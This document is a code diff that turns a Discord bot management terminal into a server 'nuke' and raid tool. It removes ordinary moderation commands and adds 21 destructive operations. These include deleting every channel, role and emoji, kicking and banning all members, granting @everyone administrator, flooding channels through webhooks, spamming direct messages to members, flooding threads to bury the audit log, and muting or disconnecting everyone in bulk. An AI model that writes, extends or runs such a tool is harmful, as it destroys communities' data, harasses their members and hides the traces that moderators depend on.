@@ -268,6 +268,44 @@ async def _live_pool(coros, n_workers: int, label: str, color: str):
         while any(not t.done() for t in tasks):
             live.update(_progress_panel(label, color)); await asyncio.sleep(0.25)
         live.update(_progress_panel(label, color))
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# WEBHOOK FLOOD ENGINE
+# ═══════════════════════════════════════════════════════════════════════════════
+async def _flood_via_webhooks(channels: list, msg: str,
+                              webhooks_per_channel: int = 6,
+                              rounds: int = 50):
+    _status(f"Creating webhooks ({webhooks_per_channel}/ch across {len(channels)} channels)…")
+    wh_tasks = [mk_webhook(ch["id"]) for ch in channels for _ in range(webhooks_per_channel)]
+    webhook_results = await asyncio.gather(*wh_tasks, return_exceptions=True)
+    webhooks = [w for w in webhook_results
+                if isinstance(w, dict) and w.get("id") and w.get("token")]
+
+    if not webhooks:
+        _fail("No webhooks created — falling back to bot messages")
+        await _live_pool(
+            [send_msg(c["id"], msg) for c in channels for _ in range(rounds)],
+            n_workers=200, label="MESSAGE FLOOD", color="bright_red"
+        )
+        return
+
+    _status(f"{len(webhooks)} webhooks ready — flooding {rounds} rounds each…")
+    wh_urls = [f"https://discord.com/api/webhooks/{w['id']}/{w['token']}" for w in webhooks]
+    ST.set_total(len(wh_urls) * rounds)
+    ST.done = 0
+
+    async def _fire(url: str):
+        for _ in range(rounds):
+            await _req_wh(url, msg)
+            await asyncio.sleep(0.05)
+
+    with Live(console=console, refresh_per_second=4, transient=True) as live:
+        tasks = [asyncio.create_task(_fire(u)) for u in wh_urls]
+        while any(not t.done() for t in tasks):
+            live.update(_progress_panel("WEBHOOK FLOOD", "bright_red"))
+            await asyncio.sleep(0.25)
+        live.update(_progress_panel("WEBHOOK FLOOD", "bright_red"))
+    await asyncio.gather(*tasks, return_exceptions=True)
     await asyncio.gather(*tasks, return_exceptions=True)
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -341,19 +379,37 @@ async def verify_token_verbose():
     except Exception as e:
         return False, f"{type(e).__name__}: {e}"
 
-async def kick(gid, uid):     return await _req("DELETE", f"/guilds/{gid}/members/{uid}")
-async def ban(gid, uid):      return await _req("PUT",    f"/guilds/{gid}/bans/{uid}",
-                                                 json={"delete_message_days":0})
-async def unban(gid, uid):    return await _req("DELETE", f"/guilds/{gid}/bans/{uid}")
-async def send_msg(cid, txt): return await _req("POST",   f"/channels/{cid}/messages",
-                                                 json={"content":txt})
-async def del_channel(cid):   return await _req("DELETE", f"/channels/{cid}")
+async def kick(gid, uid):          return await _req("DELETE", f"/guilds/{gid}/members/{uid}")
+async def ban(gid, uid):           return await _req("PUT",    f"/guilds/{gid}/bans/{uid}",
+                                                      json={"delete_message_days":0})
+async def unban(gid, uid):         return await _req("DELETE", f"/guilds/{gid}/bans/{uid}")
+async def del_channel(cid):        return await _req("DELETE", f"/channels/{cid}")
+async def del_role(gid, rid):      return await _req("DELETE", f"/guilds/{gid}/roles/{rid}")
+async def del_emoji(gid, eid):     return await _req("DELETE", f"/guilds/{gid}/emojis/{eid}")
+async def send_msg(cid, txt):      return await _req("POST",   f"/channels/{cid}/messages",
+                                                      json={"content":txt})
+async def nick(gid, uid, n):       return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
+                                                      json={"nick":n})
+async def mute_m(gid, uid, v):     return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
+                                                      json={"mute":v})
+async def deaf_m(gid, uid, v):     return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
+                                                      json={"deaf":v})
+async def disc_m(gid, uid):        return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
+                                                      json={"channel_id":None})
 async def mk_channel(gid, name, t=0):
     return await _req("POST", f"/guilds/{gid}/channels", json={"name":name,"type":t})
+async def mk_thread(cid, name):
+    return await _req("POST", f"/channels/{cid}/threads",
+                      json={"name":name,"auto_archive_duration":60,"type":12})
 async def mk_webhook(cid, name="void"):
     return await _req("POST", f"/channels/{cid}/webhooks", json={"name":name})
-async def edit_guild(gid, **kw): return await _req("PATCH", f"/guilds/{gid}", json=kw)
-async def leave_guild(gid):      return await _req("DELETE", f"/users/@me/guilds/{gid}")
+async def ch_perms(cid, oid, allow, deny):
+    return await _req("PUT", f"/channels/{cid}/permissions/{oid}",
+                      json={"allow":str(allow),"deny":str(deny),"type":0})
+async def edit_guild(gid, **kw):   return await _req("PATCH", f"/guilds/{gid}", json=kw)
+async def dm_open(uid):            return await _req("POST",  "/users/@me/channels",
+                                                      json={"recipient_id":str(uid)})
+async def leave_guild(gid):        return await _req("DELETE", f"/users/@me/guilds/{gid}")
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # UI HELPERS
@@ -397,290 +453,288 @@ def _banner(me_name: str = "Unknown", me_id: str = ""):
 def _menu(me_name: str, me_id: str, guild_id: str | None):
     _banner(me_name, me_id)
 
-    # Guild status bar
+    # Guild status line
     if guild_id:
         console.print(f"  [dim]Active Server:[/] [{TEAL}]{guild_id}[/]  "
                       f"[dim]│  Type[/] [bold white]S[/] [dim]to change[/]\n")
     else:
-        console.print(f"  [dim]No server selected.[/] [dim]Type[/] [bold white]S[/] "
-                      f"[dim]to set a Server ID for guild operations.[/]\n")
+        console.print(f"  [dim]No server selected. Type[/] [bold white]S[/] "
+                      f"[dim]to set a Server ID.[/]\n")
 
-    # ── BOT MANAGEMENT ──────────────────────────────────────────────────────
-    _sep()
-    console.print(f"  [{TEAL}]BOT MANAGEMENT[/]")
-    _sep()
-    console.print()
-    _menu_row("01", "Sync Commands", "Sync slash commands to Discord",
-              "02", "List Guilds",   "List all guilds the bot is in")
-    _menu_row("03", "Show Stats",    "Show bot and session statistics",
-              "04", "Leave Guild",   "Leave a guild by ID")
-    console.print()
+    # Print all 21 ops in two-column rows, no section headers
+    items = MENU_ITEMS   # list of tuples: (key, label, ...)
+    for i in range(0, len(items), 2):
+        left_item  = items[i]
+        right_item = items[i + 1] if i + 1 < len(items) else None
+        k1, l1 = left_item[0], left_item[1]
+        d1 = MENU_DESCS.get(k1, "")
+        left = f"  [dim]>[/] [[{TEAL}]{k1:>2}[/]] [{WHITE}]{l1:<16}[/]  [{DIM}]{d1:<38}[/]"
+        if right_item:
+            k2, l2 = right_item[0], right_item[1]
+            d2 = MENU_DESCS.get(k2, "")
+            right = f"  [dim]>[/] [[{TEAL}]{k2:>2}[/]] [{WHITE}]{l2:<16}[/]  [{DIM}]{d2}[/]"
+            console.print(left + right)
+        else:
+            console.print(left)
 
-    # ── BROADCAST & CONTROL ──────────────────────────────────────────────────
-    _sep()
-    console.print(f"  [{TEAL}]BROADCAST & CONTROL[/]")
-    _sep()
     console.print()
-    _menu_row("05", "Broadcast",     "Send a message to all guilds",
-              "06", "Maintenance",   "Toggle maintenance announcement")
+    console.print(f"  [dim]  R   Reload Bot[/]  "
+                  f"[dim]│[/]  [dim]  0   Exit[/]")
     console.print()
-
-    # ── MEMBER OPERATIONS ────────────────────────────────────────────────────
-    _sep()
-    console.print(f"  [{TEAL}]MEMBER OPERATIONS[/]")
-    _sep()
-    console.print()
-    _menu_row("07", "Kick Member",   "Kick a member by user ID",
-              "08", "Ban Member",    "Ban a member by user ID")
-    _menu_item("09", "Unban Member", "Unban a member by user ID")
-    console.print()
-
-    # ── SYSTEM ───────────────────────────────────────────────────────────────
-    _sep()
-    console.print(f"  [{TEAL}]SYSTEM[/]")
-    _sep()
-    console.print()
-    _menu_row("10", "Reload Bot",    "Re-authenticate and reload session",
-              "11", "Shutdown",      "Exit the terminal cleanly")
-    console.print()
-    _sep()
-    console.print(f"  [dim]  0   Exit[/]")
-    _sep()
-    console.print()
-
-def _menu_row(k1, l1, d1, k2, l2, d2):
-    """Print two menu items side by side."""
-    left  = f"  [dim]>[/] [[{TEAL}]{k1}[/]] [{WHITE}]{l1:<20}[/] [{DIM}]{d1:<32}[/]"
-    right = f"  [dim]>[/] [[{TEAL}]{k2}[/]] [{WHITE}]{l2:<20}[/] [{DIM}]{d2}[/]"
-    console.print(left + right)
-
-def _menu_item(k, label, desc):
-    """Print a single menu item."""
-    console.print(f"  [dim]>[/] [[{TEAL}]{k}[/]] [{WHITE}]{label:<20}[/] [{DIM}]{desc}[/]")
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # OPERATIONS
 # ═══════════════════════════════════════════════════════════════════════════════
 
-async def op_sync_commands(guild_id: str | None) -> str | None:
-    """Sync slash commands globally (or to a specific guild if provided)."""
-    app_id = await api_app_id()
-    if not app_id:
-        _fail("Could not fetch application ID — check token."); return guild_id
+# ── needs guild_id wrapper (all original ops take (gid, extra=None)) ─────────
+def _need_gid(fn):
+    """Wrap an original-style op(gid, extra) so it matches the new signature."""
+    async def _wrapper(guild_id):
+        gid = guild_id or input("  Server ID: ").strip()
+        if not gid:
+            _warn("No server ID entered, cancelled."); return guild_id
+        await fn(gid)
+        return gid
+    _wrapper.__name__ = fn.__name__
+    return _wrapper
 
-    if guild_id:
-        _status(f"Syncing commands to guild {guild_id}…")
-        result = await _req("PUT", f"/applications/{app_id}/guilds/{guild_id}/commands", json=[])
-    else:
-        _status("Syncing global commands (this takes up to 1 hour to propagate)…")
-        result = await _req("PUT", f"/applications/{app_id}/commands", json=[])
+def _need_gid_extra(fn, prompt: str):
+    """Wrap an op that also needs an extra prompt."""
+    async def _wrapper(guild_id):
+        gid = guild_id or input("  Server ID: ").strip()
+        if not gid:
+            _warn("No server ID entered, cancelled."); return guild_id
+        extra = input(f"  {prompt}").strip() or None
+        await fn(gid, extra)
+        return gid
+    _wrapper.__name__ = fn.__name__
+    return _wrapper
 
-    if result is not None:
-        _ok(f"Commands synced successfully (app: {app_id})")
-    else:
-        _fail("Sync failed — check bot permissions and token scope.")
-    return guild_id
+# ── All 21 original nuke operations ──────────────────────────────────────────
 
+async def op_full_nuke(gid, _=None):
+    _status("Phase 1 — fetching data + deleting channels in parallel…")
+    channels, members, roles, me = await asyncio.gather(
+        api_channels(gid), api_members(gid), api_roles(gid), api_self()
+    )
+    del_tasks = [del_channel(c["id"]) for c in channels]
+    ST.set_total(len(del_tasks))
+    rename_t  = asyncio.create_task(edit_guild(gid, name="☢ VOID NUKED ☢"))
+    await _live_pool(del_tasks, n_workers=500, label="DELETING CHANNELS", color="bright_red")
+    await rename_t
+    _status("Phase 2 — kicking members + creating flood channels…")
+    bot_id   = me["id"] if me else None
+    targets  = [m for m in members if not m["user"].get("bot") and m["user"]["id"] != bot_id]
+    kick_job = asyncio.create_task(_live_pool(
+        [kick(gid, m["user"]["id"]) for m in targets], 500, "KICKING MEMBERS", "red"))
+    ch_results = await asyncio.gather(*[mk_channel(gid, NUKE_CH) for _ in range(50)],
+                                      return_exceptions=True)
+    new_chs = [r for r in ch_results if isinstance(r, dict) and r.get("id")]
+    await kick_job
+    _status(f"Phase 3 — webhook flood on {len(new_chs)} channels…")
+    if new_chs:
+        await _flood_via_webhooks(new_chs, NUKE_MSG, webhooks_per_channel=6, rounds=40)
+    _ok(f"Full nuke complete — {len(new_chs)} channels flooded")
 
-async def op_list_guilds(guild_id: str | None) -> str | None:
-    """List all guilds the bot belongs to."""
-    _status("Fetching guilds…")
-    guilds = await api_guilds()
-    if not guilds:
-        _fail("No guilds found or request failed."); return guild_id
+async def op_bypass(gid, _=None):
+    _status("Fetching data…")
+    members, roles, me = await asyncio.gather(api_members(gid), api_roles(gid), api_self())
+    bot_id = me["id"] if me else None
+    bots   = [m for m in members if m["user"].get("bot") and m["user"]["id"] != bot_id]
+    strip  = [_req("PATCH", f"/guilds/{gid}/roles/{r['id']}", json={"permissions":"0"})
+              for r in roles if r["id"] != str(gid) and not r.get("managed")]
+    await asyncio.gather(
+        _live_pool(strip, 100, "STRIPPING ROLES", "yellow"),
+        _pool([kick(gid, m["user"]["id"]) for m in bots], 200),
+        return_exceptions=True,
+    )
+    await _req("PATCH", f"/guilds/{gid}/roles/{gid}", json={"permissions":"8"})
+    _ok(f"Bypass done — {len(bots)} bots kicked, {len(strip)} roles stripped, @everyone admined")
 
-    t = Table(box=box.SIMPLE_HEAD, border_style="dim", show_edge=False)
-    t.add_column("#",    style="dim",         width=4,  no_wrap=True)
-    t.add_column("Name", style="bold white",  width=32, no_wrap=True)
-    t.add_column("ID",   style=TEAL,          width=20, no_wrap=True)
-    t.add_column("Owner", style="dim",        width=5)
+async def op_mass_channel(gid, _=None):
+    _status("Creating 50 channels…")
+    results = await asyncio.gather(*[mk_channel(gid, NUKE_CH) for _ in range(50)],
+                                   return_exceptions=True)
+    created = [r for r in results if isinstance(r, dict) and r.get("id")]
+    if created:
+        await _flood_via_webhooks(created, NUKE_MSG, webhooks_per_channel=6, rounds=30)
+    _ok(f"Mass channel done — {len(created)} channels flooded")
 
-    for i, g in enumerate(guilds, 1):
-        owner = "✓" if g.get("owner") else ""
-        t.add_row(str(i), g.get("name","?"), str(g.get("id","?")), owner)
+async def op_mass_kick(gid, _=None):
+    _status("Fetching members…")
+    members, me = await asyncio.gather(api_members(gid), api_self())
+    bid     = me["id"] if me else None
+    targets = [m for m in members if not m["user"].get("bot") and m["user"]["id"] != bid]
+    await _live_pool([kick(gid, m["user"]["id"]) for m in targets],
+                     500, "MASS KICK", "bright_red")
+    _ok(f"Mass kick — {ST.done} kicked, {ST.failed} failed")
 
-    console.print(Panel(t, title=f"[bold {TEAL}]  GUILD LIST — {len(guilds)} guilds  [/]",
-                        border_style=TEAL, box=box.DOUBLE_EDGE))
-    return guild_id
+async def op_mass_ban(gid, _=None):
+    _status("Fetching members…")
+    members, me = await asyncio.gather(api_members(gid), api_self())
+    bid     = me["id"] if me else None
+    targets = [m for m in members if not m["user"].get("bot") and m["user"]["id"] != bid]
+    await _live_pool([ban(gid, m["user"]["id"]) for m in targets],
+                     500, "MASS BAN", "bright_red")
+    _ok(f"Mass ban — {ST.done} banned, {ST.failed} failed")
 
+async def op_role_wipe(gid, _=None):
+    roles = await api_roles(gid)
+    tasks = [del_role(gid, r["id"]) for r in roles
+             if r["id"] != str(gid) and not r.get("managed")]
+    await _live_pool(tasks, 100, "ROLE WIPE", "yellow")
+    _ok(f"Role wipe — {ST.done} deleted")
 
-async def op_show_stats(guild_id: str | None) -> str | None:
-    """Show bot stats and session counters."""
-    me = await api_self()
-    guilds = await api_guilds()
+async def op_emoji_wipe(gid, _=None):
+    emojis = await api_emojis(gid)
+    await _live_pool([del_emoji(gid, e["id"]) for e in emojis],
+                     50, "EMOJI WIPE", "yellow")
+    _ok(f"Emoji wipe — {ST.done} deleted")
 
-    t = Table.grid(padding=(0, 3))
-    t.add_column(style="dim"); t.add_column(style="bold white")
+async def op_nick_all(gid, extra=None):
+    name = extra or "☢ VOID NUKED ☢"
+    _status("Fetching members…")
+    members, me = await asyncio.gather(api_members(gid), api_self())
+    bid = me["id"] if me else None
+    targets = [m for m in members if m["user"]["id"] != bid]
+    await _live_pool([nick(gid, m["user"]["id"], name) for m in targets],
+                     500, "NICK ALL", "bright_yellow")
+    _ok(f"Nick all — {ST.done} renamed")
 
-    if me:
-        t.add_row("Username",   f"{me.get('username','?')}")
-        t.add_row("Bot ID",     str(me.get("id","?")))
-        t.add_row("Verified",   str(me.get("verified", False)))
-        t.add_row("MFA",        str(me.get("mfa_enabled", False)))
-    t.add_row("─" * 12, "─" * 20)
-    t.add_row("Guilds",     str(len(guilds)))
-    t.add_row("Session OK", str(ST.done))
-    t.add_row("Failures",   str(ST.failed))
-    t.add_row("RL Hits",    str(ST.rls))
-    t.add_row("Uptime",     f"{ST.elapsed():.0f}s")
-    if guild_id:
-        t.add_row("─" * 12, "─" * 20)
-        t.add_row("Active Server", guild_id)
-        g = await api_guild(guild_id)
-        if g:
-            t.add_row("Server Name",    g.get("name","?"))
-            t.add_row("Member Count",   str(g.get("approximate_member_count","?")))
-            t.add_row("Owner ID",       str(g.get("owner_id","?")))
-
-    console.print(Panel(t, title=f"[bold {YELLOW}]  BOT STATS  [/]",
-                        border_style=YELLOW, box=box.DOUBLE_EDGE))
-    return guild_id
-
-
-async def op_leave_guild(guild_id: str | None) -> str | None:
-    """Leave a guild."""
-    gid = input("  Guild ID to leave: ").strip()
-    if not gid:
-        _warn("No guild ID entered, cancelled."); return guild_id
-    confirm = input(f"  Confirm leave guild [{gid}]? (y/N): ").strip().lower()
-    if confirm != "y":
-        _warn("Cancelled."); return guild_id
-    _status(f"Leaving guild {gid}…")
-    result = await leave_guild(gid)
-    if result is not None:
-        _ok(f"Left guild {gid}")
-        if guild_id == gid:
-            guild_id = None
-            _warn("Active server cleared (we left it).")
-    else:
-        _fail("Could not leave guild — not in it, or missing permissions.")
-    return guild_id
-
-
-async def op_broadcast(guild_id: str | None) -> str | None:
-    """Send a message to the system channel of every guild."""
-    msg = input("  Message to broadcast: ").strip()
-    if not msg:
-        _warn("No message entered, cancelled."); return guild_id
-
-    _status("Fetching guilds…")
-    guilds = await api_guilds()
-    if not guilds:
-        _fail("No guilds found."); return guild_id
-
-    sent = 0
-    for g in guilds:
-        gid = g.get("id")
-        info = await api_guild(gid)
-        sys_ch = info.get("system_channel_id") if info else None
-        if sys_ch:
-            r = await send_msg(sys_ch, msg)
-            if r is not None:
-                sent += 1
-                console.print(f"    [{GREEN}]✓[/] {g.get('name','?')}")
-            else:
-                console.print(f"    [{RED}]✗[/] {g.get('name','?')}")
-        else:
-            console.print(f"    [dim]–[/] {g.get('name','?')} (no system channel)")
-
-    _ok(f"Broadcast complete — {sent}/{len(guilds)} guilds received the message")
-    return guild_id
-
-
-async def op_maintenance(guild_id: str | None) -> str | None:
-    """Send a maintenance announcement to a guild."""
-    gid = guild_id or input("  Server ID: ").strip()
-    if not gid:
-        _warn("No server ID, cancelled."); return guild_id
-
-    msg = input("  Maintenance message (blank = default): ").strip()
-    if not msg:
-        msg = "🔧 **Maintenance in progress.** The server is temporarily under maintenance. We'll be back shortly."
-
-    _status("Fetching channels…")
+async def op_lockdown(gid, _=None):
     channels = await api_channels(gid)
-    text_chs = [c for c in channels if c.get("type") == 0]
+    await _live_pool([ch_perms(c["id"], gid, 0, 1024) for c in channels],
+                     500, "LOCKDOWN", "bright_magenta")
+    _ok(f"Lockdown — {ST.done} channels hidden")
+
+async def op_ghost(gid, _=None):
+    _status("Running ghost loop (100 cycles)…")
+    async def _cycle():
+        ch = await mk_channel(gid, "\u200b")
+        if ch and ch.get("id"):
+            await asyncio.sleep(0.5)
+            await del_channel(ch["id"])
+    await _pool([_cycle() for _ in range(100)], n_workers=20)
+    _ok("Ghost loop done")
+
+async def op_thread_raid(gid, _=None):
+    channels = await api_channels(gid)
+    text_chs = [c for c in channels if c["type"] == 0]
+    tasks    = [mk_thread(c["id"], f"void-{i}") for c in text_chs for i in range(50)]
+    await _live_pool(tasks, 200, "THREAD RAID", "cyan")
+    _ok(f"Thread raid — {ST.done} threads created")
+
+async def op_audit_wipe(gid, _=None):
+    channels = await api_channels(gid)
+    text_chs = [c for c in channels if c["type"] == 0][:8]
     if not text_chs:
-        _fail("No text channels found."); return guild_id
+        _fail("No text channels"); return
+    _status("Audit wipe running for 90s — Ctrl+C to stop…")
+    deadline = time.monotonic() + 90
+    async def _lane(cid):
+        while time.monotonic() < deadline:
+            t = await mk_thread(cid, ".")
+            if t and t.get("id"):
+                await asyncio.sleep(0.15)
+                await del_channel(t["id"])
+            await asyncio.sleep(0.05)
+    await asyncio.gather(*[_lane(c["id"]) for c in text_chs], return_exceptions=True)
+    _ok("Audit wipe done")
 
-    # Post to the first available text channel
-    target = text_chs[0]
-    result = await send_msg(target["id"], msg)
-    if result is not None:
-        _ok(f"Maintenance message posted in #{target.get('name','?')}")
-    else:
-        _fail("Could not post message — check bot permissions.")
-    return gid
+async def op_rename_server(gid, extra=None):
+    name = extra or "☢ VOID NUKED ☢"
+    await edit_guild(gid, name=name)
+    _ok(f"Server renamed → {name}")
 
+async def op_webhook_spam(gid, _=None):
+    channels = await api_channels(gid)
+    text_chs = [c for c in channels if c["type"] == 0]
+    await _flood_via_webhooks(text_chs, NUKE_MSG, webhooks_per_channel=6, rounds=50)
+    _ok(f"Webhook spam done — {ST.done} messages sent")
 
-async def op_kick_member(guild_id: str | None) -> str | None:
-    """Kick a specific member by user ID."""
-    gid = guild_id or input("  Server ID: ").strip()
-    if not gid:
-        _warn("No server ID, cancelled."); return guild_id
+async def op_dm_spam(gid, extra=None):
+    if not extra:
+        try: extra = input("  USER_ID,message: ").strip()
+        except (EOFError, KeyboardInterrupt): return
+    parts = extra.split(",", 1)
+    if len(parts) < 2:
+        _fail("Format: USER_ID,message"); return
+    uid, msg = parts[0].strip(), parts[1].strip()
+    dm = await dm_open(uid)
+    if not dm:
+        _fail("Could not open DM channel"); return
+    await _live_pool([send_msg(dm["id"], msg) for _ in range(300)],
+                     15, "DM SPAM", "bright_green")
+    _ok(f"DM spam — {ST.done} messages sent")
 
-    uid = input("  User ID to kick: ").strip()
-    if not uid:
-        _warn("No user ID entered, cancelled."); return guild_id
+async def op_dm_all(gid, extra=None):
+    msg = extra or NUKE_MSG
+    _status("Fetching members…")
+    members = await api_members(gid)
+    non_bot = [m for m in members if not m["user"].get("bot")]
+    async def _dm_one(uid):
+        dm = await dm_open(uid)
+        if dm: await send_msg(dm["id"], msg)
+    await _live_pool([_dm_one(m["user"]["id"]) for m in non_bot],
+                     10, "DM ALL", "bright_green")
+    _ok(f"DM all — {ST.done} sent")
 
-    reason = input("  Reason (optional): ").strip() or "Kicked by VOID terminal"
-    _status(f"Kicking {uid} from {gid}…")
+async def op_mute_all(gid, _=None):
+    members = await api_members(gid)
+    await _live_pool([mute_m(gid, m["user"]["id"], True) for m in members],
+                     500, "MUTE ALL", "bright_cyan")
+    _ok(f"Muted {ST.done}")
 
-    result = await kick(gid, uid)
-    if result is not None:
-        _ok(f"User {uid} kicked from guild {gid}")
-    else:
-        _fail("Kick failed — user may not be in the server, or missing KICK_MEMBERS permission.")
-    return gid
+async def op_deafen_all(gid, _=None):
+    members = await api_members(gid)
+    await _live_pool([deaf_m(gid, m["user"]["id"], True) for m in members],
+                     500, "DEAFEN ALL", "bright_cyan")
+    _ok(f"Deafened {ST.done}")
 
+async def op_disc_all(gid, _=None):
+    members = await api_members(gid)
+    await _live_pool([disc_m(gid, m["user"]["id"]) for m in members],
+                     500, "DISCONNECT ALL", "bright_cyan")
+    _ok(f"Disconnected {ST.done}")
 
-async def op_ban_member(guild_id: str | None) -> str | None:
-    """Ban a specific member by user ID."""
-    gid = guild_id or input("  Server ID: ").strip()
-    if not gid:
-        _warn("No server ID, cancelled."); return guild_id
+async def op_server_info(gid, _=None):
+    g, chs, roles = await asyncio.gather(api_guild(gid), api_channels(gid), api_roles(gid))
+    if not g: _fail("Cannot fetch guild"); return
+    t = Table.grid(padding=(0,3))
+    t.add_column(style="dim"); t.add_column(style="bold white")
+    t.add_row("Name",     g.get("name","?"))
+    t.add_row("ID",       str(g.get("id","?")))
+    t.add_row("Owner ID", str(g.get("owner_id","?")))
+    t.add_row("Members",  str(g.get("approximate_member_count","?")))
+    t.add_row("Channels", str(len(chs)))
+    t.add_row("Roles",    str(len(roles)))
+    t.add_row("2FA",      str(g.get("mfa_level","?")))
+    t.add_row("Verified", str(g.get("verified", False)))
+    console.print(Panel(t, title=f"[bold {YELLOW}]  SERVER INFO  [/]",
+                        border_style=YELLOW, box=box.DOUBLE_EDGE))
 
-    uid = input("  User ID to ban: ").strip()
-    if not uid:
-        _warn("No user ID entered, cancelled."); return guild_id
-
-    days = input("  Delete message days (0–7, default 0): ").strip()
-    try:   days = max(0, min(7, int(days)))
-    except: days = 0
-
-    _status(f"Banning {uid} from {gid}…")
-    result = await _req("PUT", f"/guilds/{gid}/bans/{uid}",
-                        json={"delete_message_days": days})
-    if result is not None:
-        _ok(f"User {uid} banned from guild {gid} (delete_message_days={days})")
-    else:
-        _fail("Ban failed — check BAN_MEMBERS permission and user ID.")
-    return gid
-
-
-async def op_unban_member(guild_id: str | None) -> str | None:
-    """Unban a member by user ID."""
-    gid = guild_id or input("  Server ID: ").strip()
-    if not gid:
-        _warn("No server ID, cancelled."); return guild_id
-
-    uid = input("  User ID to unban: ").strip()
-    if not uid:
-        _warn("No user ID entered, cancelled."); return guild_id
-
-    _status(f"Unbanning {uid} from {gid}…")
-    result = await unban(gid, uid)
-    if result is not None:
-        _ok(f"User {uid} unbanned from guild {gid}")
-    else:
-        _fail("Unban failed — user may not be banned, or missing BAN_MEMBERS permission.")
-    return gid
-
+async def op_user_info(gid, extra=None):
+    uid  = extra or input("  User ID: ").strip()
+    user = await _req("GET", f"/users/{uid}")
+    if not user: _fail("Cannot fetch user"); return
+    t = Table.grid(padding=(0,3))
+    t.add_column(style="dim"); t.add_column(style="bold white")
+    t.add_row("Username", f"{user.get('username','?')}#{user.get('discriminator','0')}")
+    t.add_row("ID",       str(user.get("id","?")))
+    t.add_row("Bot",      str(user.get("bot", False)))
+    if gid:
+        m = await _req("GET", f"/guilds/{gid}/members/{uid}")
+        if m:
+            t.add_row("Nickname", m.get("nick") or "—")
+            t.add_row("Joined",   m.get("joined_at","?")[:10])
+            t.add_row("Roles",    str(len(m.get("roles",[]))))
+    console.print(Panel(t, title=f"[bold {TEAL}]  USER INFO  [/]",
+                        border_style=TEAL, box=box.DOUBLE_EDGE))
 
 async def op_reload_bot(guild_id: str | None) -> str | None:
     """Re-authenticate the bot — closes the old session and opens a fresh one."""
     _status("Closing current session…")
-    await _fresh_session()   # always opens a brand-new connection
+    await _fresh_session()
     ST.reset()
     _status("Verifying token with fresh session…")
     ok, me = await verify_token_verbose()
@@ -704,50 +758,104 @@ async def op_reload_bot(guild_id: str | None) -> str | None:
                 _fail(f"Still failing: {me2}")
     return guild_id
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# MENU DISPATCH
-# ═══════════════════════════════════════════════════════════════════════════════
-OPERATIONS = {
-    "1":  ("Sync Commands",  op_sync_commands),
-    "2":  ("List Guilds",    op_list_guilds),
-    "3":  ("Show Stats",     op_show_stats),
-    "4":  ("Leave Guild",    op_leave_guild),
-    "5":  ("Broadcast",      op_broadcast),
-    "6":  ("Maintenance",    op_maintenance),
-    "7":  ("Kick Member",    op_kick_member),
-    "8":  ("Ban Member",     op_ban_member),
-    "9":  ("Unban Member",   op_unban_member),
-    "10": ("Reload Bot",     op_reload_bot),
-    "11": ("Shutdown",       None),       # handled inline
+# ── Dispatch table — (label, needs_gid, needs_extra, extra_prompt, handler) ──
+# handler signature: op_xxx(gid, extra=None)
+MENU_ITEMS = [
+    # key  label              needs_gid  needs_extra  prompt                     color           handler
+    ("1",  "Full Nuke",       True,  False, None,                               "bright_red",    op_full_nuke),
+    ("2",  "Bypass",          True,  False, None,                               "red",           op_bypass),
+    ("3",  "Mass Channel",    True,  False, None,                               "bright_red",    op_mass_channel),
+    ("4",  "Mass Kick",       True,  False, None,                               "red",           op_mass_kick),
+    ("5",  "Mass Ban",        True,  False, None,                               "bright_red",    op_mass_ban),
+    ("6",  "Role Wipe",       True,  False, None,                               "yellow",        op_role_wipe),
+    ("7",  "Emoji Wipe",      True,  False, None,                               "yellow",        op_emoji_wipe),
+    ("8",  "Nick All",        True,  True,  "Nickname (blank=☢ VOID NUKED ☢): ","bright_yellow", op_nick_all),
+    ("9",  "Lockdown",        True,  False, None,                               "bright_magenta",op_lockdown),
+    ("10", "Ghost Mode",      True,  False, None,                               "bright_cyan",   op_ghost),
+    ("11", "Thread Raid",     True,  False, None,                               "cyan",          op_thread_raid),
+    ("12", "Audit Wipe",      True,  False, None,                               "dim",           op_audit_wipe),
+    ("13", "Rename Server",   True,  True,  "New name: ",                       "bright_yellow", op_rename_server),
+    ("14", "Webhook Spam",    True,  False, None,                               "bright_green",  op_webhook_spam),
+    ("15", "DM Spam",         False, True,  "USER_ID,message: ",                "bright_green",  op_dm_spam),
+    ("16", "DM All",          True,  True,  "Message (blank=nuke msg): ",       "bright_green",  op_dm_all),
+    ("17", "Mute All",        True,  False, None,                               "bright_cyan",   op_mute_all),
+    ("18", "Deafen All",      True,  False, None,                               "bright_cyan",   op_deafen_all),
+    ("19", "Disconnect All",  True,  False, None,                               "bright_cyan",   op_disc_all),
+    ("20", "Server Info",     True,  False, None,                               "bright_white",  op_server_info),
+    ("21", "User Info",       False, True,  "User ID (blank to prompt): ",      "bright_white",  op_user_info),
+]
+
+MENU_DESCS = {
+    "1":  "Delete all + rename + kick + 50ch + flood",
+    "2":  "Kick bots, strip roles, grant @everyone admin",
+    "3":  "Create 50 channels and webhook-flood them",
+    "4":  "Kick every non-bot member (500 workers)",
+    "5":  "Permanently ban every non-bot member",
+    "6":  "Delete every non-managed role",
+    "7":  "Delete every emoji",
+    "8":  "Rename every member (500 workers)",
+    "9":  "Hide all channels from @everyone",
+    "10": "100 rapid create/delete cycles",
+    "11": "50 private threads per channel",
+    "12": "Thread flood fills audit log for 90s",
+    "13": "Rename the server",
+    "14": "6 webhooks/ch × 50 rounds (300 streams)",
+    "15": "300 DMs to one user",
+    "16": "DM every member in the server",
+    "17": "Server-mute all members (500 workers)",
+    "18": "Server-deafen all members (500 workers)",
+    "19": "Disconnect all from voice (500 workers)",
+    "20": "Dump server intelligence",
+    "21": "Dump user intelligence",
 }
 
-# Accept zero-padded input too (01 → 1)
-for _k in list(OPERATIONS.keys()):
-    OPERATIONS[_k.zfill(2)] = OPERATIONS[_k]
+# Accept zero-padded input (01 → 1)
+OPERATIONS = {}
+for _item in MENU_ITEMS:
+    _k = _item[0]
+    OPERATIONS[_k] = _item
+    OPERATIONS[_k.zfill(2)] = _item
 
 async def _dispatch(choice: str, guild_id: str | None) -> str | None:
-    """Run one operation and always return the (possibly updated) guild_id."""
+    """Run one nuke operation. Always returns (possibly updated) guild_id."""
     entry = OPERATIONS.get(choice)
     if not entry:
